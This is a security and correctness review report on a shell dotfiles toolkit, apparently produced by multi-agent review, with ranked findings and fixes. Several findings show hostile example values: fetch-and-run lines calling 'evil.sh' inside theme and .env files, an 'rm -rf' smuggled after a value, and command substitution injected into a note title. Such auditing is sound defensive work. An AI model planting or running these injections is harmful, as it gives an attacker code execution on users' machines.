# Ultracode Review Findings — 2026-07-11

Multi-agent adversarial review of the live tree (excludes `legacy/`).

**Method:** 4 parallel review lenses — spine contracts, shell correctness,
installer/supply-chain security, cross-platform conventions — each finding then
handed to an independent adversarial verifier instructed to *refute* it
(read-only reproduction probes allowed). 38 agents total.

**Result: 33 findings raised → 33 confirmed, 0 refuted** (two cross-lens duplicates
collapsed below → 31 unique). The 5 HIGH findings were fixed in the same
PR that added this file; the rest are a ranked backlog.

Severity: **high** = breaks a user flow or security hole · **medium** = wrong
behavior in a realistic case · **low** = latent hazard.

---

## HIGH — user-flow breakage

### `scripts/utils/situation.sh:78` — HIGH (xplat) ✅ **FIXED in this PR**

All 17 probe commands are wrapped in GNU coreutils `timeout` with no guard or fallback, but macOS is an explicitly supported target (Darwin notify branch at line 61, launchd installer at lines 453-459, config/launchd/com.openclaw.situation.plist) where `timeout` does not exist -- every probe silently fails, so the situation snapshot reports the whole fleet down on macOS.

> **Failure:** On a stock Mac, `claw situation install` copies the launchd plist and runs `tick` every 60s. Each probe like `tj="$(timeout 3 tailscale status --json 2>/dev/null)"` (line 78; also 97, 111, 120, 183, 189, 196-222, 252, 261, 282, 312-313) exits 127 (command not found) with output discarded -> tailscale reads as down, GPU/k8s/homelab as absent, `timeout 2 ping -c1 -W1` (line 120) always reports the homelab unreachable -> the cached JSON is wholesale wrong and transition notifications fire on bogus state. brew coreutils does not fix it: it installs `gtimeout` in /opt/homebrew/bin, and the unprefixed `timeout` lives only in libexec/gnubin, which the plist PATH (/opt/homebrew/bin:...) does not include -- the plist authors even patched PATH for yq/jq/tailscale but missed this. (Secondary: `ping -W1` is 1ms on BSD ping vs 1s on Linux.) Fix: define a `timeout` shim when the binary is missing, e.g. `command -v timeout >/dev/null || timeout(){ shift; "$@"; }` or prefer gtimeout.

### `scripts/utils/toolkit.sh:88` — HIGH (correctness) ✅ **FIXED in this PR**

Docker category (choice 2) prints its submenu but never does `read ... sub` before `case $sub in`, so $sub is always empty and every Docker workflow is unreachable.

> **Failure:** User runs `claw toolkit`, picks 2 (Containers & Docker Management): the 5-item submenu prints, then `case $sub in` immediately evaluates with $sub unset (all other categories have `read -p ... sub`; this one only has a shellcheck comment where the read should be) and falls to `*) Invalid choice.` — lazydocker/prune/stop-all can never be launched from this menu.

### `scripts/utils/toolkit.sh:194` — HIGH (xplat) ✅ **FIXED in this PR**

Bash script calls the zsh-only shim clip_copy without ever sourcing shell/platform.zsh, so the 'Copy SSH public key' workflow (System Utilities option 2) fails with 'clip_copy: command not found' on every platform.

> **Failure:** User runs `claw toolkit` (bin/claw:556 execs `bash toolkit.sh`), the `tk` alias (aliases.zsh:36), or the welcome TUI entry (welcome-tui.zsh:320) -> toolkit runs as a child bash process where zsh functions are not inherited and platform.zsh is never sourced -> selecting 6 (System Utilities) then 2 (copy SSH key) pipes the pubkey into a nonexistent command: bash prints 'clip_copy: command not found', nothing is copied, and the success message never prints -- on macOS AND Linux. Same file also uses `clip_copy` at line 196. Fix: source "$DOTFILES_DIR/shell/platform.zsh" at the top (its syntax is bash-compatible) or use the guarded fallback chain that specs.sh:145-154 already implements.

### `scripts/utils/tunnel-manager.sh:512` — HIGH (correctness) ✅ **FIXED in this PR**

Post-increment `((total++))` (and `((active_count++))` line 378, `((count++))` line 359) under `set -euo pipefail` returns exit 1 when the variable is 0, killing the script — the main tunnel TUI aborts as soon as any tunnel is configured.

> **Failure:** User has a valid tunnels.yml with >=1 tunnel and runs `tun` (main_menu): draw_overview's first loop iteration executes ((total++)) with total=0, the arithmetic evaluates to 0, returns status 1, set -e exits the script after the banner — the fzf menu never appears. Same class: `tunkill` (disconnect_all) exits after disconnecting the first tunnel via ((count++)), and `tunls` (list_active) dies at the first active tunnel via ((active_count++)). Verified: `bash -c 'set -e; x=0; ((x++)); echo ok'` exits 1 without printing.

### `shell/welcome-tui.zsh:332` — HIGH (spine) ✅ **FIXED in this PR**

The TUI's 'Open Vault' (vault_open) and 'Clin Notes' (clin_open) entries always fail on login because their helper functions are sourced after the TUI runs: .zshrc runs claw_welcome_tui at step 3 (shell/.zshrc:57) but obsidian.zsh/clin.zsh are only sourced at step 6 (shell/.zshrc:114-116), so _claw_obsidian_vault (obsidian.zsh:42) and cl (clin.zsh:31) don't exist yet.

> **Failure:** User opens a new terminal, picks Direct Actions -> Open Vault from the login menu -> welcome-tui.zsh:332 'typeset -f _claw_obsidian_vault' fails -> prints 'obsidian helpers not loaded' every time; same for Clin Notes at line 348 ('clin plugin not loaded'). The entries only work when the TUI is relaunched via the claw() shell function after full .zshrc init. Same root cause degrades _claw_profile_readout's generic _claw_profile_tool_check fallback (profile-helpers.zsh also loads at step 6).

## MEDIUM — wrong behavior in realistic cases

### `bin/claw:574` — MEDIUM (spine)

cmd_obsidian's 'zsh -ic' child shells source ~/.zshrc, whose step 3 fires claw_welcome_tui; the only thing preventing the full login FZF menu from popping up mid-command is the inherited CLAW_ACTIVE_PROFILE env var, which is unset in common cases (TUI 'skip' pick, bash callers, direct bin/claw invocation).

> **Failure:** From a shell where CLAW_ACTIVE_PROFILE is unset (e.g. user chose 'skip -> Shell' at login, or is in bash), 'claw obsidian list' spawns an interactive zsh, .zshrc:57 launches the full welcome TUI; the user must ESC through it (which then sources the default profile and renders the whole dashboard inside the throwaway child) before ovaults finally runs. Same for cmd_menu (bin/claw:257): the TUI fires once from .zshrc and a second time from the -c command when the first pick was 'skip'.

### `bin/claw:860` — MEDIUM (correctness)

`live_plugins=$(claude plugin list 2>/dev/null | grep -c '❯ .*@')` under the script's `set -e` (line 8): grep -c exits 1 on zero matches, the assignment fails, and `claw claude-sync status` silently aborts.

> **Failure:** On a machine where `claude` is installed but has zero plugins (fresh box before `claw claude-sync sync` — exactly the machine you'd run `status` on), grep -c prints 0 but exits 1; set -e kills the script mid-command with no output after the snapshot line and exit code 1. The comment above (lines 856-858) documents removing `|| echo 0` to fix a previous bug, which introduced this one. Verified: `bash -c 'set -e; v=$(echo x | grep -c nomatch); echo after'` exits 1 without printing.

### `bin/claw:589` — MEDIUM (correctness)

cmd_obsidian interpolates raw user text into a double-quoted `zsh -ic "... on \"$n\""` command string (also lines 593 search, 604 capture), so titles containing double quotes, $, or backticks break the command or execute as shell code.

> **Failure:** `claw obsidian new 'Q3 "planning" notes'` — the embedded quotes terminate the inner quoting and zsh reports a parse error / creates the wrong note. `claw obsidian capture 'cost was $(hostname)'` executes hostname via command substitution inside the child zsh instead of capturing the literal text.

### `install.sh:76` — MEDIUM (security)

When run via `curl | bash`, install.sh infers the repo URL from the CWD's `git remote get-url origin`, so running the one-liner from inside any unrelated git repo clones THAT repo to ~/.dotfiles and execs its bootstrap.sh.

> **Failure:** User runs `curl -fsSL .../install.sh | bash` while cwd is ~/projects/some-other-repo (SCRIPT_DIR resolves to cwd under piped stdin, the line-31 repo check fails, and origin of the wrong repo is used). install.sh then clones some-other-repo into ~/.dotfiles (line 96) and `exec bash bootstrap.sh` (line 101) — executing an arbitrary third-party repo's bootstrap.sh with warmed sudo credentials (lines 61-65), and permanently claiming ~/.dotfiles with the wrong repo so future `git pull` updates track it.

### `scripts/install/packages/common.sh:75` — MEDIUM (security)

rclone is installed by piping an unpinned, unverified remote script directly into `sudo bash` (`curl -fsSL https://rclone.org/install.sh | sudo bash`) during every full bootstrap on non-brew systems.

> **Failure:** Fresh Ubuntu bootstrap (Step 4 sources common.sh) where rclone is absent: whatever rclone.org serves at that moment executes as root with no checksum, signature, or version pin. A compromised rclone.org, CDN, or TLS-interception point yields root code execution on every machine that runs bootstrap.sh. Same-family unpinned root-capable installers: get.k3s.io (scripts/install/homelab-toolchain.sh:181) and ollama.com/install.sh (homelab-toolchain.sh:198, hermes.sh:41, provision.sh:78) both self-escalate via sudo internally.

### `scripts/utils/pkg-manifest.sh:192` — MEDIUM (security)

The `curl:<url>` manifest source type pipes whatever URL is listed in config/manifest/tools.list straight into `sh` with no pinning or checksum, and tracked entries include installers that self-escalate to root.

> **Failure:** `claw pkg install all` (also run by `claw provision` on a fresh box) hits tools.list entries `mise|curl:https://mise.run` (line 56) and `ollama|curl:https://ollama.com/install.sh` (line 79); the ollama installer internally invokes sudo to write to /usr/local and install systemd units, so a compromised upstream or any line quietly added to the auto-committed manifest (`pkg track --commit` auto-commits with no review, lines 161-164) becomes unverified code execution — up to root — on every provisioned machine.

### `scripts/utils/tunnel-manager.sh:27` — MEDIUM (correctness)

SSH ControlMaster sockets live in the fixed world-shared path /tmp/ssh-tunnels; `mkdir -p` silently adopts a pre-existing directory owned by another user, enabling control-socket hijack/DoS on multi-user hosts.

> **Failure:** On a shared machine, another local user pre-creates /tmp/ssh-tunnels (mkdir -p succeeds without error against the attacker-owned dir). The attacker can then remove/replace the victim's mux sockets or plant their own socket at a known tunnel name, so the victim's `ssh -o ControlPath=/tmp/ssh-tunnels/<name>` multiplexes through an attacker-controlled master. Should be under $XDG_RUNTIME_DIR or a mktemp -d / $HOME path with 0700 perms.

### `shell/aliases.zsh:446` — MEDIUM (spine)

A second claw() function is defined in aliases.zsh, directly violating spine contract #1 ('Never define a second claw()' — the exact bug CLAUDE.md says was already fixed once); it is dead-shadowed only because claw-fn.zsh happens to be sourced two lines later (.zshrc:109 vs :111).

> **Failure:** If claw-fn.zsh fails to load or the source order in .zshrc:109-111 is ever swapped, this stale definition wins: 'claw update', 'claw doctor', 'claw agent list' etc. all hit its unknown-profile branch and print 'Unknown profile: update / Available: default security cloud devops ai research cortex local' (only 8 of 18 profiles listed); its load path also skips claw_theme_apply_profile, PROFILE_TAG, missing-tool nudges, and usage telemetry that the canonical claw-fn.zsh version provides.

### `shell/aliases.zsh:766` — MEDIUM (correctness)

Second definitions of extract() (line 766) and fkill() (line 838) silently override the richer earlier ones (extract at 530, fkill at 594) — zsh keeps the last definition, dropping .tar.xz/.tar.zst/.xz/.zst support and fkill's header-skip/multi-select.

> **Failure:** `extract foo.tar.xz` or `extract foo.tar.zst` prints "'foo.tar.xz' cannot be extracted" even though the (shadowed) first definition at line 530 handles both. The surviving fkill (838) pipes `ps aux` into fzf without `sed 1d` or `-m`: selecting the header row makes it run `kill -9 PID` (the literal string), which errors; multi-kill (TAB select) documented by the first version is gone.

### `shell/aliases.zsh:39` — MEDIUM (correctness)

The cat() wrapper calls `bat` with no `command -v bat` guard (and `alias grep='rg'` line 50, `alias diff='delta'` line 55, `du='dust'`/`df='duf'` lines 64-65, `top='btop'` line 58 are equally unguarded), violating the repo's own guard convention and breaking core commands on hosts missing the modern tools.

> **Failure:** On a box where bat isn't installed yet (mid-bootstrap, minimal install, or a server missing one brew formula), any interactive `cat file` fails with 'command not found: bat' — the fallback `command cat` branch is only taken for pipes, so the basic command is fully broken interactively. Same for grep/diff/du/df/top when rg/delta/dust/duf/btop are absent. Contrast with the eza block (line 13) which is correctly guarded.

### `shell/claw-fn.zsh:35` — MEDIUM (spine)

The bare-profile shorthand rewrites any arg matching shell/profiles/<arg>.zsh to 'claw load <arg>', and since a 'claude' profile exists (shell/profiles/claude.zsh), the registered 'claude' agent is shadowed — contradicting both the inline comment ('agents and subcommands are never shadowed') and 'claw help' (bin/claw:220 documents 'claw <agent> — launch a registered agent (claude, hermes, …)').

> **Failure:** In an interactive zsh, 'claw claude' loads the claude PROFILE (sources claude.zsh, re-themes, renders the dashboard) instead of launching the Claude Code CLI via cmd_run_agent as the help text promises; the same command from bash or 'bin/claw claude' launches the agent, so behavior silently differs by shell.

### `shell/load-env.zsh:45` — MEDIUM (security)

load-env.zsh SOURCES scripts/utils/secret.sh (to import exported secrets), but secret.sh runs `set -uo pipefail` at line 16, which persists in the interactive zsh after the source — turning on nounset+pipefail for the user's entire shell session.

> **Failure:** Any user who has run `claw secret env` (so config/secrets/.env.sops exists) and has sops installed: every new interactive shell sources secret.sh at .zshrc step 6, leaving `set -u` enabled. Subsequent init (zsh-syntax-highlighting, completions, p10k at steps 7-8) and everyday functions that reference unset parameters start aborting with 'parameter not set' errors. Verified empirically: `zsh -c 'source <file with set -uo pipefail>; echo ${UNSETVAR}'` errors — the option persists after source.

## LOW — latent hazards

### `bin/claw:313` — LOW (spine)

cmd_tui_stats bucket regexes are stale versus the actual TUI keys: the profile bucket omits homelab/blackwell/tunnels/vault (all four now load profiles per welcome-tui.zsh:254), the tool bucket lists 'homelab|tunnel|vault' but the TUI emits 'homelab_ssh', 'tunnel_mgr', 'vault_open', and 'clin_open' (welcome-tui.zsh:181-184), and the line-311 comment ('vault routes to the Obsidian opener') no longer describes the code.

> **Failure:** A user who mostly picks Blackwell/Tunnels profiles or the tunnel_mgr/vault_open/clin_open actions gets those picks counted in NEITHER bucket, 'homelab' profile loads counted as tool picks, and vault profile loads counted as tool picks — so tui_verdict's useful_pct is understated and can emit 'KILL: TUI is mostly tax' for a heavily-used TUI (the whole point of this instrumentation is that keep/kill decision).

### `bin/claw:655` — LOW (spine)

cmd_skills hardcodes its fzf --color string ('bg+:#161b22,fg+:#c9d1d9,prompt:#bc8cff,...') although theme.sh is already sourced at bin/claw:22 and exports the claw_theme_fzf helper built for exactly this — violating spine contract #2.

> **Failure:** With any non-default palette active (claw theme set tokyo-night), 'claw skills' renders the picker in GitHub-dark instead of the active theme, unlike theme-compliant surfaces that consume claw_theme_fzf.

### `bin/claw:890` — LOW (spine)

cmd_claude's unknown-subcommand hint says 'try: claw claude help', but the dispatcher only routes 'claude-sync|csync' to cmd_claude (bin/claw:1056) — 'claw claude ...' falls through to cmd_run_agent and execs the claude CLI binary.

> **Failure:** User runs 'claw claude-sync bogus', gets 'try: claw claude help', types 'claw claude help' — which launches the Claude Code CLI with arg 'help' (or the claude profile load, via the claw-fn shorthand, in zsh) instead of printing the claude-sync usage card.

### `bin/claw:380` — LOW (correctness)

tui_verdict ends with `(( skip_pct > 10 )) && printf ...`; when skip_pct <= 10 (the common case) the function returns 1, and under the script's `set -e` this aborts `claw tui-stats` before the final log-path line, exiting 1.

> **Failure:** With >=30 fires and a skip rate of 10% or less, `claw tui-stats` prints the verdict then dies: the trailing `printf "log: ..."` at line 352 is never reached and the command exits nonzero despite succeeding. Verified pattern: `bash -c 'set -e; f(){ printf k; ((0>10)) && printf s; }; f; echo tail'` exits 1 without printing 'tail'.

### `bootstrap.sh:207` — LOW (security)

`sudo ln -sf "$(command -v fdfind)" /usr/local/bin/fd` (and batcat→bat at line 212) creates a root-owned entry in /usr/local/bin pointing at a PATH-resolved location that can be a user-writable file.

> **Failure:** Ubuntu's default ~/.profile puts ~/.local/bin on PATH. If a file named `fdfind` exists in ~/.local/bin (planted by any code running as the user) when bootstrap re-runs, the root-owned symlink /usr/local/bin/fd points at a user-writable binary; any later invocation of `fd` by root or another user executes user-controlled code — a user→root escalation primitive. The target should be pinned to the dpkg path (/usr/bin/fdfind) rather than PATH lookup.

### `bootstrap.sh:331` — LOW (security)

Binary/asset downloads are extracted without any checksum or version pin: the Nerd Font tarball from the floating `releases/latest` URL is piped straight into `tar x` into ~/.local/share/fonts (line 332); Font Awesome zip (line 345) and the Oh-My-Zsh installer curl|sh (line 248) are likewise unverified.

> **Failure:** Bootstrap on Linux fetches https://github.com/ryanoasis/nerd-fonts/releases/latest/download/JetBrainsMono.tar.xz and unpacks whatever bytes arrive — a compromised release asset or MITM'd connection writes arbitrary files into the font dir (tar paths are not sanitized beyond -C), and the OMZ installer at line 248 executes arbitrary unpinned upstream shell as the user; only TLS stands between upstream compromise and local execution, with no local hash check despite the repo shipping an integrity framework.

### `scripts/utils/handoff.sh:33` — LOW (xplat)

The auto-open of the freshly written handoff note is permanently dead code: claw_open is a zsh function defined only in shell/platform.zsh, which this bash script never sources, so `command -v claw_open` always fails in every invocation path.

> **Failure:** User runs `claw handoff` (dispatched by bin/claw as a bash child process) on macOS or Linux -> `command -v claw_open &>/dev/null` is false because zsh functions are not visible to bash -> the `|| true` swallows it and the note is written but never opened, on all platforms, with no hint to the user. Fix: source shell/platform.zsh (bash-compatible) or use an inline open/xdg-open fallback like scripts/utils/ai.sh:7 does.

### `scripts/utils/integrity.sh:6` — LOW (security)

The integrity manifest is self-attesting — stored inside the tree it verifies, unsigned, and auto-regenerated by bootstrap Step 9b (bootstrap.sh:442) — so it cannot deliver the header's claim that it lets a user 'prove that the install they ran matches the upstream repo'.

> **Failure:** An attacker who tampers with any script simply runs `claw integrity generate` (or lets the next bootstrap.sh run do it automatically at line 442) and `claw integrity verify` passes clean; the verifier itself (integrity.sh) and manifest.sha256 live in the same writable tree, so verify only ever detects accidental drift since the last local generate, not tampering. There is no signature, upstream hash pin, or out-of-band anchor.

### `scripts/utils/theme.sh:78` — LOW (correctness)

claw_theme_load evals palette values inside double quotes (`eval "export CLAW_C_$_u=\"$_v\""`), so any theme-file value containing $( ), backticks, or $vars is executed as shell code, and the key is interpolated unvalidated into a variable name.

> **Failure:** A palette.theme line like `blue=$(curl evil.sh|sh)` in a third-party/tampered theme dropped into config/themes/ executes on every shell startup (theme.sh is sourced by .zshrc step 2b and runs claw_theme_load unconditionally at line 245). Even benign values with a `$` break the export. A `case`-validated hex match or plain `export` via printf -v would close it.

### `scripts/utils/toolkit.sh:301` — LOW (correctness)

`echo "## $ttitle\n\n**System Prompt:**..."` uses bash echo without -e, so the prompt-template note is written with literal backslash-n sequences instead of newlines.

> **Failure:** Toolkit menu 8 -> option 3 (Save Prompt Template): the created Obsidian note contains a single line `## title\n\n**System Prompt:**\n\n**User Prompt:**` with visible \n characters rather than the intended multi-line template (script is bash via shebang, where echo does not interpret escapes; also same pattern at line 268 in the obsidian create content= arg).

### `shell/aliases.zsh:429` — LOW (correctness)

netcheck's `ss -tlnp ... | tail | wc -l | tr ... || lsof ...` fallback is dead code: the || tests the pipeline's last command (tr), which succeeds even when ss doesn't exist, so the lsof branch never runs.

> **Failure:** On macOS (no ss), `netcheck` always reports "Listening ports: 0 services" — ss fails but tail/wc/tr still emit '0' with exit 0, so lsof is never consulted. The `listening`/`conns` aliases (395-396) are structured correctly (|| after the bare command); this one is not.

### `shell/load-env.zsh:14` — LOW (security)

The .env file is executed as shell code (`set -a; source "$env_path"`) rather than parsed as key=value data, so any command substitution or trailing command in a value runs at every interactive shell start.

> **Failure:** A .env dropped or synced into the dotfiles dir containing `TOKEN=$(curl -s evil.sh | sh)` or `KEY=x; rm -rf ~/something` executes silently on every shell launch (the loader is deliberately silent per SSH-safety convention, so nothing is surfaced). secret.sh's sec_load_env (scripts/utils/secret.sh:66-74) shows the safe pattern already used elsewhere in the repo — split on first '=' and export — which load_env should mirror.

### `shell/platform.zsh:70` — LOW (xplat)

The Linux local_ip shim's fallback chain is dead: `hostname -I 2>/dev/null | awk '{print $1}'` always exits 0 (awk succeeds on empty input), so the `|| ip -4 addr ... || echo 'offline'` branches can never run.

> **Failure:** On an offline Linux box (or one where `hostname -I` prints nothing), `local_ip` emits an empty string instead of 'offline', diverging from the macOS branch (line 68) which correctly falls back to 'offline'. Any consumer comparing against 'offline' or displaying the value gets a blank. Fix: capture output first and test non-emptiness, e.g. `ip=$(hostname -I 2>/dev/null | awk '{print $1}'); [[ -n $ip ]] && echo $ip || ...`.

### `shell/welcome-tui.zsh:389` — LOW (spine)

The agents FZF picker hardcodes GitHub-dark colors ('bg+:#161b22,...') even though the theme-derived _fzf_color variable computed at lines 98-104 is in scope in the same function — a spine contract #2 violation (theme.sh is the single color source; never hardcode hex in a surface).

> **Failure:** User runs 'claw theme set gruvbox-material' then opens Direct Actions -> Agents: every other menu re-themes but this picker stays GitHub-dark, because the --color string ignores claw_theme_fzf/CLAW_C_*.
